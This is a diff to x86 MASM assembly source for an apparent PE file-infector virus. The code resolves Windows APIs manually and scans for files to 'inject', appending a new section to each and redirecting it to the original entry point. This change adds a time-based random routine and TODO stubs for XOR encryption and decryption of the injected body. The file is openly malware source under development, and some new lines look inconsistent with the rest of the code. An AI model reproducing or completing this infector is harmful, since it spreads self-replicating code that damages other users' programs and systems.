@@ -9,12 +9,7 @@ option casemap:none
 include		\masm32\include\windows.inc
 include		\masm32\include\user32.inc
 include		\masm32\include\kernel32.inc
-
-includelib	\masm32\lib\user32.lib
-includelib	\masm32\lib\kernel32.lib
-
 include		\masm32\include\msvcrt.inc
-includelib	\masm32\lib\msvcrt.lib
 
 
 ; Source of life
@@ -72,11 +67,12 @@ SizeOfRawData		dd	?
 PointerToRawData	dd	?
 
 ; DLL
+sCreateFileMapping	db	'CreateFileMappingA', 0 
+sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
+sGetSystemTime	db	'GetSystemTime', 0
 sExitProcess	db	'ExitProcess', 0 
 sCreateFile	db	'CreateFileA', 0 
-sCreateFileMapping	db	'CreateFileMappingA', 0 
 sMapViewOfFile	db	'MapViewOfFile', 0 
-sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
 sCloseHandle	db	'CloseHandle', 0 
 sWriteFile	db	'WriteFile', 0 
 sGetProcAddress	db	'GetProcAddress', 0 
@@ -87,11 +83,12 @@ sFindNextFile	db	'FindNextFileA', 0
 sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
 sUser32		db	'USER32.DLL', 0
 sKernel32	db	'KERNEL32.DLL', 0
+pCreateFileMapping	dd	?
+pUnmapViewOfFile	dd	?
+pGetSystemTime	dd	?
 pExitProcess	dd	?
 pCreateFile	dd	?
-pCreateFileMapping	dd	?
 pMapViewOfFile	dd	?
-pUnmapViewOfFile	dd	?
 pCloseHandle	dd	?
 pWriteFile	dd	?
 pMessageBox	dd	?
@@ -101,6 +98,19 @@ pLoadLibrary	dd	?
 pGetProcAddress	dd	?
 pFindFirstFile	dd	?
 pFindNextFile	dd	?
+
+; OTHERS
+_SYSTEMTIME	STRUC
+Year		dw	?
+Month		dw	?
+DayOfWeek	dw	?
+Day		dw	?
+Hour		dw	?
+Minute		dw	?
+Second		dw	?
+Milliseconds	dw	?
+_SYSTEMTIME	ENDS
+STime		_SYSTEMTIME	<>
 
 
 ; TODO
@@ -173,6 +183,7 @@ GETADDR	sCloseHandle, pKernel32, pCloseHandle
 GETADDR	sWriteFile, pKernel32, pWriteFile
 GETADDR	sFindFirstFile, pKernel32, pFindFirstFile
 GETADDR	sFindNextFile, pKernel32, pFindNextFile
+GETADDR	sGetSystemTime, pKernel32, pGetSystemTime
 
 
 ; INJECT ALL THE FILES !
@@ -433,6 +444,9 @@ lodsb
 stosb
 loop	createNewSection
 
+; CREATING ENCRYPTER
+; TODO Call rand and use it when copying (xor)
+
 ; CREATING JUMP TO OLD ENTRY POINT
 mov	edi, errorExit - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
@@ -445,6 +459,9 @@ mov	edx, errorExit - toInject
 sub	eax, edx
 sub	eax, 05h ; Add 5 bytes for JMP
 stosd
+
+; CREATING DECRYPTER
+; TODO loop on all and xoring with the rand used in the encrypter
 
 ; DEBUG FILE INJECTED - TODO REMOVE
 push	0
@@ -483,16 +500,26 @@ mov	eax, 042h
 mov	eax, 042h
 mov	eax, 042h
 mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
-mov	eax, 042h
 push	0
 call 	[DELTA pExitProcess]
 
 
 ; UTILS
+; Random number (EAX: Max && Return Value)
+random:
+push	ecx
+push	edx
+mov	ecx, eax
+push	STime
+call	pGetSystemTime
+xor	eax, eax
+mov	ax, word ptr [DELTA STime.Milliseconds]
+div	ecx
+mov	eax, edx
+pop	edx
+pop	ecx
+ret
+
 ; Compare two strings : ecx/edx (EAX[0]: MATCH)
 strcmp:
 mov	al, [ecx]
